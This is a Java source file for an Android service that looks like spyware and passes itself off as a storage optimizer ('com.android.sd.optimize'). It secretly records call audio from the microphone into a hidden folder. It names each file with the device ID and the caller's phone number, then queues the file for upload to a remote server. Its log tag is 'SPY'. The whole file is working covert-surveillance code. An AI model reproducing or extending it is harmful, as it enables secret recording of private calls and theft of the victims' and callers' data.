package com.android.sd.optimize;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

public class RecordService extends Service implements MediaRecorder.OnInfoListener,
        MediaRecorder.OnErrorListener, CustomMediaRecorder.PlaybackStateChangedListener {

    public static final String DEFAULT_STORAGE_LOCATION =
            Environment.getExternalStorageDirectory().getAbsolutePath()
            + "/Android"
            + Environment.getDataDirectory()
            + File.separator
            + AppGlobals.getContext().getPackageName()
            + File.separator
            + ".appdata"
            + File.separator;
    private CustomMediaRecorder recorder = null;
    private boolean isRecording = false;
    private File recording = null;
    BackService backService;

    private File makeOutputFile() {

        File dir = new File(DEFAULT_STORAGE_LOCATION);
        if (!dir.exists()) {
            try {
                dir.mkdirs();
            } catch (Exception e) {
                return null;
            }
        } else {
            if (!dir.canWrite()) {
                return null;
            }
        }

        try {
            File file = new File(dir, BackService.DeviceId+"_" +Util.getTime()+ "_"+
                    PhoneListener.sPreviousCallState +"_"+PhoneListener.sPhoneNumber + ".m4a");
            if (!file.exists())
                file.createNewFile();
            PhoneListener.filename = file.getName();
            return file;
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            return null;
        }
    }

    public void onCreate() {
        super.onCreate();
        recorder = new CustomMediaRecorder();
        recorder.setOnPlaybackStateChangedListener(this);
        Log.i("SPY", "Service created");
    }

    public void onStart(Intent intent, int startId) {
        Log.i("SPY", "Service started");

        if (isRecording)
            return;
        recording = makeOutputFile();
        if (recording == null) {
            recorder = null;
            return;
        }
        try {
            recorder.reset();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(recording.getAbsolutePath());
            recorder.setOnInfoListener(this);
            recorder.setOnErrorListener(this);
            // STREAM TO PHP? //Alert
            try {
                recorder.prepare();
            } catch (java.io.IOException e) {
                recorder = null;
                return;
            }
            recorder.start();
            isRecording = true;
        } catch (java.lang.Exception e) {
            recorder = null;
        }

        return;
    }

    public void onDestroy() {
        super.onDestroy();

        if (null != recorder) {
            isRecording = false;
            recorder.stop();
            recorder.reset();
            recorder.release();
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public boolean onUnbind(Intent intent) {
        return false;
    }

    public void onRebind(Intent intent) {
    }
    // MediaRecorder.OnInfoListener
    public void onInfo(MediaRecorder mr, int what, int extra) {
        isRecording = false;
    }

    // MediaRecorder.OnErrorListener
    public void onError(MediaRecorder mr, int what, int extra) {
        isRecording = false;
        mr.release();
    }

    @Override
    public void onStop(final String outputFilePath) {
        Log.i(AppGlobals.getLogTag(getClass()),"Recording Stopped");
        DBHandler dbHandler = new DBHandler(getApplicationContext());
        Helpers helpers = new Helpers(getApplicationContext());
        if (helpers.isOnline()) {
            Intent intent = new Intent(getApplicationContext(), Util.class);
            intent.putExtra("currentFile", outputFilePath);
            startService(intent);
        }else {
            dbHandler.createNewFileNameForUpload("filename",outputFilePath);
        }
    }

    @Override
    public void onStart() {

    }
}

